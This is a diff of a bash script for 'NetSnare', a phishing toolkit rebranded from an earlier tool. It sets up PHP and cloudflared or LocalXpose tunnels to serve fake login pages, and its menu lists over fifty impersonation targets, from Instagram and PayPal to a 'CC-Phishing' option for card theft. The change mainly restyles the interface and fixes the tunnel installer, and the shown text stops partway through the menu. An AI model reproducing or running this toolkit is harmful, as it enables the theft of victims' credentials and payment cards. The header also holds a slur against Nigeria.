@@ -1,1222 +1,1063 @@
 #!/bin/bash
-#Author: @a_lonely_ooo
-#Credits to: Akshay  &  TAHMID RAYAT 
-#Version: 3.3.2 updated
-#Do not copy script without authors' consent it is illegal and makes you as stupid as Nigeria or as stupid as the p in psychology
-#instagram: https://instagram.com/@a_lonely_ooo
+# Author: Jayansh
+# Credits: @a_lonely_ooo
+# Version: 1.0.0 (Quantum Beta)
+# GitHub: a-lonely-ooo
+# Do not copy script without author's consent. It's illegal and unethical.
+# Instagram: https://instagram.com/@a_lonely_ooo
+
+# New Color Scheme (Cyberpunk)
 clear='\033[0m'       # Text Reset
-# Regular Colors
-Black='\033[0;30m'        # Black
-Red='\033[0;31m'          # Red
-Green='\033[0;32m'        # Green
-Yellow='\033[0;33m'       # Yellow
-Blue='\033[0;34m'         # Blue
-Purple='\033[0;35m'       # Purple
-Cyan='\033[0;36m'         # Cyan
-White='\033[0;37m'        # White
-Orange='\033[33m'         # Orange
-LGREY='\033[0;30m'		  # LightGrey
-# Bold
-BBlack='\033[1;30m'       # Black
-BRed='\033[1;31m'         # Red
-BGreen='\033[1;32m'       # Green
-BYellow='\033[1;33m'      # Yellow
-BBlue='\033[1;34m'        # Blue
-BPurple='\033[1;35m'      # Purple
-BCyan='\033[1;36m'        # Cyan
-BWhite='\033[1;37m'       # White
-BLGREY='\033[1;30m'		  # Grey
-# Underline
-UBlack='\033[4;30m'       # Black
-URed='\033[4;31m'         # Red
-UGreen='\033[4;32m'       # Green
-UYellow='\033[4;33m'      # Yellow
-UBlue='\033[4;34m'        # Blue
-UPurple='\033[4;35m'      # Purple
-UCyan='\033[4;36m'        # Cyan
-UWhite='\033[4;37m'       # White
-__version__="3.3.2"
-## DEFAULT HOST & PORT
+NeonBlue='\033[0;94m' # Neon Blue
+HotPink='\033[0;95m'  # Hot Pink
+AcidGreen='\033[0;92m' # Acid Green
+VoidBlack='\033[0;30m' # Void Black
+BNeonBlue='\033[1;94m' # Bold Neon Blue
+BHotPink='\033[1;95m'  # Bold Hot Pink
+BAcidGreen='\033[1;92m' # Bold Acid Green
+BWhite='\033[1;37m'    # Bold White
+UNeonBlue='\033[4;94m' # Underline Neon Blue
+UHotPink='\033[4;95m'  # Underline Hot Pink
+
+# Default Host & Port
 HOST='127.0.0.1'
 PORT='5555'
-## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" ORANGE="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
-REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+
+# ANSI Colors (FG & BG)
+NEONBLUE="$(printf '\033[94m')"
+HOTPINK="$(printf '\033[95m')"
+ACIDGREEN="$(printf '\033[92m')"
+VOIDBLACK="$(printf '\033[30m')"
+NEONBLUEBG="$(printf '\033[104m')"
+HOTPINKBG="$(printf '\033[105m')"
+ACIDGREENBG="$(printf '\033[102m')"
+VOIDBLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
-BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
-##Script Termination
+
+__version__="1.0.0"
+
+# Script Termination
 exit_on_signal_SIGINT() {
-    { echo -ne "\n\n""${RED}[${White}!${RED}]${Red} Program Interrupted. " 2>&1; reset_color; }
+    echo -ne "\n\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Quantum Matrix Terminated${clear}\n"
     exit 0
 }
 exit_on_signal_SIGTERM() {
-    { echo -ne "\n\n""${RED}[${White}!${RED}]${Red} Program Interrupted. " 2>&1; reset_color; }
+    echo -ne "\n\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Quantum Matrix Terminated${clear}\n"
     exit 0
 }
 trap exit_on_signal_SIGINT SIGINT
 trap exit_on_signal_SIGTERM SIGTERM
+
 reset_color() {
     tput sgr0 
     tput op
     return
 }
+
 check_update() {
-    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	latest_version=$(curl -s "https://api.github.com/repos/TermuxHackz/anonphisher/releases/latest" | grep -Po '"tag_name": "\K.*?(?=")')
-	if [[ $latest_version != "" ]]; then
-		if [[ $latest_version != $__version__ ]]; then
-			echo -e "${GREEN}New version available : ${ORANGE}$latest_version${WHITE}"
-			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Updating to latest version..."
-			git pull
-			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Update successful."
-			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Restarting tool..."
-			bash setup
-			exit 0
-		else
-			echo -e "${GREEN}No update available."
-			sleep 1
-		fi
-	else
-		echo -e "${RED}Failed to check for update."
-	fi
-
+    echo -ne "\n${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Scanning for Quantum Updates...${clear} "
+    latest_version=$(curl -s "https://api.github.com/repos/TermuxHackz/anonphisher/releases/latest" | grep -Po '"tag_name": "\K.*?(?=")')
+    if [[ $latest_version != "" ]]; then
+        if [[ $latest_version != $__version__ ]]; then
+            echo -e "${AcidGreen}New Quantum Core Available: ${HotPink}$latest_version${clear}"
+            echo -e "${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Upgrading Quantum Matrix...${clear}"
+            git pull
+            echo -e "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Quantum Upgrade Complete${clear}"
+            if [[ -f "netsnare.sh" ]]; then
+                echo -e "${NeonBlue}[${BWhite}🔄${NeonBlue}]${AcidGreen} Rebooting NetSnare...${clear}"
+                exec bash netsnare.sh
+            else
+                echo -e "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Error: netsnare.sh Not Found${clear}"
+                exit 1
+            fi
+        else
+            echo -e "${AcidGreen}Quantum Core Up-to-Date${clear}"
+            sleep 1
+        fi
+    else
+        echo -e "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Update Scan Failed${clear}"
+    fi
 }
+
 check_internet() {
-    echo -ne "\n${Green}[${White}+${Green}]${Cyan} Internet Status: "
+    echo -ne "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Matrix Status: "
     timeout 3s curl -fIs "https://github.com/NetSnare" > /dev/null
-    [ $? -eq 0 ] && echo -e "${Green}Online${White}" && check_update || echo -e "${Red}Offline${White}"
+    [ $? -eq 0 ] && echo -e "${AcidGreen}Online${clear}" && check_update || echo -e "${HotPink}Offline${clear}"
 }
+
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
-
-	if [[ -d "/data/data/com.termux/files/home" ]]; then
-		if [[ ! $(command -v proot) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
-			pkg install proot resolv-conf -y
-		fi
-
-		if [[ ! $(command -v tput) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
-			pkg install ncurses-utils -y
-		fi
-	fi
-
-	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
-	else
-		pkgs=(php curl unzip)
-		for pkg in "${pkgs[@]}"; do
-			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
-				if [[ $(command -v pkg) ]]; then
-					pkg install "$pkg" -y
-				elif [[ $(command -v apt) ]]; then
-					sudo apt install "$pkg" -y
-				elif [[ $(command -v apt-get) ]]; then
-					sudo apt-get install "$pkg" -y
-				elif [[ $(command -v pacman) ]]; then
-					sudo pacman -S "$pkg" --noconfirm
-				elif [[ $(command -v dnf) ]]; then
-					sudo dnf -y install "$pkg"
-				elif [[ $(command -v yum) ]]; then
-					sudo yum -y install "$pkg"
-				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
-					{ reset_color; exit 1; }
-				fi
-			}
-		done
-	fi
+    echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Deploying Quantum Modules...${clear}"
+    if [[ -d "/data/data/com.termux/files/home" ]]; then
+        if [[ ! $(command -v proot) ]]; then
+            echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Installing Module: ${HotPink}proot${clear}"
+            pkg install proot resolv-conf -y
+        fi
+        if [[ ! $(command -v tput) ]]; then
+            echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Installing Module: ${HotPink}ncurses-utils${clear}"
+            pkg install ncurses-utils -y
+        fi
+    fi
+    if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
+        echo -e "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Modules Already Deployed${clear}"
+    else
+        pkgs=(php curl unzip)
+        for pkg in "${pkgs[@]}"; do
+            type -p "$pkg" &>/dev/null || {
+                echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Installing Module: ${HotPink}$pkg${clear}"
+                if [[ $(command -v pkg) ]]; then
+                    pkg install "$pkg" -y
+                elif [[ $(command -v apt) ]]; then
+                    sudo apt install "$pkg" -y
+                elif [[ $(command -v apt-get) ]]; then
+                    sudo apt-get install "$pkg" -y
+                elif [[ $(command -v pacman) ]]; then
+                    sudo pacman -S "$pkg" --noconfirm
+                elif [[ $(command -v dnf) ]]; then
+                    sudo dnf -y install "$pkg"
+                elif [[ $(command -v yum) ]]; then
+                    sudo yum -y install "$pkg"
+                else
+                    echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Unsupported Package Manager${clear}"
+                    { reset_color; exit 1; }
+                fi
+            }
+        done
+    fi
 }
-## Directories
+
+# Directories
 if [[ ! -d ".server" ]]; then
-	mkdir -p ".server"
+    mkdir -p ".server"
 fi
 if [[ ! -d "auth" ]]; then
-	mkdir -p "auth"
+    mkdir -p "auth"
 fi
 if [[ -d ".server/www" ]]; then
-	rm -rf ".server/www"
-	mkdir -p ".server/www"
+    rm -rf ".server/www"
+    mkdir -p ".server/www"
 else
-	mkdir -p ".server/www"
+    mkdir -p ".server/www"
 fi
 if [[ -e ".server/.cld.log" ]]; then
-	rm -rf ".server/.cld.log"
+    rm -rf ".server/.cld.log"
 fi
 if [[ -d .NetSnare ]]; then
-printf ""
+    printf ""
 else
-mkdir .NetSnare
+    mkdir .NetSnare
 fi
 if [[ -d logs ]]; then
-printf ""
+    printf ""
 else
-mkdir logs
-mkdir .cld.log
-mv .cld.log .server
+    mkdir logs
+    mkdir .cld.log
+    mv .cld.log .server
 fi
 if [[ -e sites.zip ]]; then
-unzip -qq sites.zip
-rm sites.zip
+    unzip -qq sites.zip
+    rm sites.zip
 fi
 if [[ -d ~/.ssh ]]; then
-printf ""
+    printf ""
 else
-mkdir ~/.ssh
+    mkdir ~/.ssh
 fi
-## Remove logfile
+# Remove logfile
 if [[ -e ".server/.loclx" ]]; then
-	rm -rf ".server/.loclx"
+    rm -rf ".server/.loclx"
 fi
 if [[ -e ".server/.cld.log" ]]; then
-	rm -rf ".server/.cld.log"
+    rm -rf ".server/.cld.log"
 fi
-## Kill already running process
+
+# Kill already running process
 kill_pid() {
-	pkill -f "php|cloudflared|loclx|localtunnel"
+    pkill -f "php|cloudflared|loclx|localtunnel"
 }
-## Download binaries
+
+# Download binaries
 download() {
-	url="$1"
-	output="$2"
-	file=`basename $url`
-	if [[ -e "$file" || -e "$output" ]]; then
-		rm -rf "$file" "$output"
-	fi
-	curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
-
-	if [[ -e "$file" ]]; then
-		if [[ ${file#*.} == "zip" ]]; then
-			unzip -qq $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
-		elif [[ ${file#*.} == "tgz" ]]; then
-			tar -zxf $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
-		else
-			mv -f $file .server/$output > /dev/null 2>&1
-		fi
-		chmod +x .server/$output > /dev/null 2>&1
-		rm -rf "$file"
-	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
-		{ reset_color; exit 1; }
-	fi
+    url="$1"
+    output="$2"
+    file=`basename $url`
+    if [[ -e "$file" || -e "$output" ]]; then
+        rm -rf "$file" "$output"
+    fi
+    curl --silent --insecure --fail --retry-connrefused \
+        --retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+    if [[ -e "$file" ]]; then
+        if [[ ${file#*.} == "zip" ]]; then
+            unzip -qq $file > /dev/null 2>&1
+            mv -f $output .server/$output > /dev/null 2>&1
+        elif [[ ${file#*.} == "tgz" ]]; then
+            tar -zxf $file > /dev/null 2>&1
+            mv -f $output .server/$output > /dev/null 2>&1
+        else
+            mv -f $file .server/$output > /dev/null 2>&1
+        fi
+        chmod +x .server/$output > /dev/null 2>&1
+        rm -rf "$file"
+    else
+        echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Download Failed: ${output}${clear}"
+        { reset_color; exit 1; }
+    fi
 }
-##Setup Custom port
+
+# Setup Custom port
 cusport() {
-	echo
-	read -n1 -p "${RED}[${WHITE}!${RED}]${ORANGE} Do you want a Custom port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
-	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
-		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
-		if [[ ! -z ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
-			PORT=${CU_P}
-			echo
-		else
-			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port number: $CU_P, Try Again...${WHITE}"
-			{ sleep 2; clear; smallbanner; cusport; }
-		fi
-	else
-		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT....${WHITE}\n"
-	fi
-
+    echo
+    read -n1 -p "${NeonBlue}[${BWhite}?${NeonBlue}]${AcidGreen} Custom Port? ${BNeonBlue}[${BWhite}y${BNeonBlue}/${BWhite}N${BNeonBlue}]: ${clear}" P_ANS
+    if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+        echo -e "\n"
+        read -n4 -p "${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Enter 4-digit Port [1024-9999]: ${BWhite}" CU_P
+        if [[ ! -z ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
+            PORT=${CU_P}
+            echo
+        else
+            echo -ne "\n\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Port: $CU_P${clear}"
+            { sleep 2; clear; smallbanner; cusport; }
+        fi
+    else
+        echo -ne "\n\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Using Default Port $PORT${clear}\n"
+    fi
 }
 
-## Install Cloudflared
+# Install Cloudflared (Fixed)
 install_cloudflared() {
-	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
-		else
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
-		fi
-	fi
-
+    if [[ -e ".server/cloudflared" ]]; then
+        echo -e "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Cloudflared Matrix Active${clear}"
+    else
+        echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Deploying Cloudflared Module...${clear}"
+        arch=`uname -m`
+        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+        elif [[ "$arch" == *'aarch64'* ]]; then
+            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+        elif [[ "$arch" == *'x86_64'* ]]; then
+            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+        else
+            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+        fi
+        # Verify binary
+        if [[ -e ".server/cloudflared" && ! -x ".server/cloudflared" ]]; then
+            chmod +x .server/cloudflared
+        fi
+        ./.server/cloudflared --version > /dev/null 2>&1
+        if [[ $? -ne 0 ]]; then
+            echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Cloudflared Binary Corrupted, Reinstalling...${clear}"
+            rm -rf .server/cloudflared
+            install_cloudflared
+        fi
+    fi
 }
-## INstall LocalXpose
+
+# Install LocalXpose
 install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then #Change to .server/loclx
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-		fi
-	fi
+    if [[ -e ".server/loclx" ]]; then
+        echo -e "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} LocalXpose Matrix Active${clear}"
+    else
+        echo -e "\n${NeonBlue}[${BWhite}➕${NeonBlue}]${AcidGreen} Deploying LocalXpose Module...${clear}"
+        arch=`uname -m`
+        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+        elif [[ "$arch" == *'aarch64'* ]]; then
+            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+        elif [[ "$arch" == *'x86_64'* ]]; then
+            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+        else
+            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+        fi
+    fi
 }
 
 menu() {
-printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m  Origin\e[0m         \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;94m Update\e[0m\n" 
-printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;94m Author\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m vk\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m adobe\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m badoo\e[0m\n"
-printf "\e[1;34m==================================================\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m cryptocoin\e[0m \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m deviantart\e[0m \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m dropbox\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m ebay\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m paypal\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m pinterest\e[0m\n"  
-printf "\e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m playstation\e[0m\e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m reddit\e[0m     \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;93m xbox\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;93m yandex\e[0m     \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;93m twitch\e[0m     \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;93m stackoverflow\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;93m messenger\e[0m  \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;93m shopify\e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;93m shopping\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;93m verizon\e[0m    \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;93m quora\e[0m      \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;93m bet9ja\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;93m Wi-Fi\e[0m      \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;93m Bitcoin\e[0m    \e[1;92m[\e[0m\e[1;77m45\e[0m\e[1;92m]\e[0m\e[1;93m free fire\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;93m Pubg\e[0m       \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;93m Fortnite\e[0m   \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;93m cc-phishing\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;93m C.O.D\e[0m      \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;93m Mediafire\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;93m Airbnb\e[0m     \e[1;92m[\e[0m\e[1;77m52\e[0m\e[1;92m]\e[0m\e[1;93m Discord\e[0m    \e[1;92m[\e[0m\e[1;77m53\e[0m\e[1;92m]\e[0m\e[1;93m Roblox\e[0m\n"
-read -p $'\n\e[1;92mNetSnare>> \e[0m\en' option
+    printf "\n${NeonBlue}┳════┤ ${BHotPink}NetSnare Quantum Interface${NeonBlue} ├════┓${clear}\n"
+    printf "${NeonBlue}┃${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Instagram   ${BAcidGreen}[09]${AcidGreen} Origin     ${BAcidGreen}[17]${AcidGreen} Gitlab${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} Facebook    ${BAcidGreen}[10]${AcidGreen} Steam      ${BAcidGreen}[18]${AcidGreen} Custom${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} Snapchat    ${BAcidGreen}[11]${AcidGreen} Yahoo      ${BAcidGreen}[19]${AcidGreen} Exit${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[04]${AcidGreen} Twitter     ${BAcidGreen}[12]${AcidGreen} Linkedin   ${BAcidGreen}[20]${AcidGreen} Update${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[05]${AcidGreen} Github      ${BAcidGreen}[13]${AcidGreen} Protonmail ${BAcidGreen}[21]${AcidGreen} Author${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[06]${AcidGreen} Google      ${BAcidGreen}[14]${AcidGreen} Wordpress  ${BAcidGreen}[22]${AcidGreen} VK${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[07]${AcidGreen} Spotify     ${BAcidGreen}[15]${AcidGreen} Microsoft  ${BAcidGreen}[23]${AcidGreen} Adobe${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[08]${AcidGreen} Netflix     ${BAcidGreen}[16]${AcidGreen} InstaFollowers ${BAcidGreen}[24]${AcidGreen} Badoo${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[25]${AcidGreen} Cryptocoin  ${BAcidGreen}[26]${AcidGreen} Deviantart ${BAcidGreen}[27]${AcidGreen} Dropbox${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[28]${AcidGreen} eBay        ${BAcidGreen}[29]${AcidGreen} PayPal     ${BAcidGreen}[30]${AcidGreen} Pinterest${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[31]${AcidGreen} Playstation ${BAcidGreen}[32]${AcidGreen} Reddit     ${BAcidGreen}[33]${AcidGreen} Xbox${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[34]${AcidGreen} Yandex      ${BAcidGreen}[35]${AcidGreen} Twitch     ${BAcidGreen}[36]${AcidGreen} StackOverflow${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[37]${AcidGreen} Messenger   ${BAcidGreen}[38]${AcidGreen} Shopify    ${BAcidGreen}[39]${AcidGreen} Shopping${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[40]${AcidGreen} Verizon     ${BAcidGreen}[41]${AcidGreen} Quora      ${BAcidGreen}[42]${AcidGreen} Bet9ja${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[43]${AcidGreen} Wi-Fi       ${BAcidGreen}[44]${AcidGreen} Bitcoin    ${BAcidGreen}[45]${AcidGreen} Free Fire${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[46]${AcidGreen} Pubg        ${BAcidGreen}[47]${AcidGreen} Fortnite   ${BAcidGreen}[48]${AcidGreen} CC-Phishing${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[49]${AcidGreen} C.O.D       ${BAcidGreen}[50]${AcidGreen} Mediafire  ${BAcidGreen}[51]${AcidGreen} Airbnb${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[52]${AcidGreen} Discord     ${BAcidGreen}[53]${AcidGreen} Roblox${clear}\n"
